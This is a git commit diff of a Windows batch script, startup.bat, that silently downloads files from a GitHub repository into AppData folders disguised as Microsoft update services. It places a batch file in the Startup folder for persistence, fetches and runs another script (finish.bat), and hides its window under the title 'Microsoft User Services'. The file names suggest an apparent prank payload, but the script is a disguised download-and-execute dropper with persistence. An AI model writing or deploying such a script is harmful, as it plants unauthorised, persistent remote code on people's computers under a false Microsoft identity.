067cf490e9100c48297ace3b69aa71500115249e
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 22:59:54 +0800

    Update startup.bat

--- Online/startup.bat
+++ Online/startup.bat
@@ -1,12 +1,16 @@
 @echo off
 
 cls
-
+title Microsoft User Services
 mkdir "%AppData%\Microsoft\Update\User\Services"
+
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/bgwork.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/rick.hta" "%AppData%\Microsoft\Update\msrkl.hta"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
 
-taskkill /f /im cmd.exe
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/finish.bat" "%AppData%\finish.bat"
+start finish.bat
+
+taskkill /fi "WINDOWTITLE eq Microsoft User Services" /f >nul 2>&1
